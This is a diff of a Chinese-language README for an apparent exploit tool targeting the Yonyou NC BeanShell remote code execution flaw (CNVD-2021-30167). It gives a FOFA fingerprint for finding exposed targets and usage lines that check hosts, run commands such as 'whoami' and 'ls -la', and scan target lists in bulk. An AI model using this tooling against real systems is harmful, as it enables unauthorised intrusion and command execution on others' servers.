@@ -1,5 +1,6 @@
-# 用友NC 漏洞合集
-# CNVD-2021-30167
+# 用友NC BeanShell远程代码执行 
+
+## CNVD-2021-30167
 
 ## FOFA
 
@@ -11,9 +12,9 @@ icon_hash="1085941792"
 ## 使用方法
 
 ```
-python ./xx.py -u http://www.example.com --check
-python ./xx.py -u http://www.example.com --cmd "whoami"
-python ./xx.py -f target.txt
+python ./YONYOU-NC-RCE.py -u http://www.example.com --check
+python ./YONYOU-NC-RCE.py -u http://www.example.com --cmd "ls -la"
+python ./YONYOU-NC-RCE.py -f target.txt
 
 optional arguments:
   -h, --help            show this help message and exit
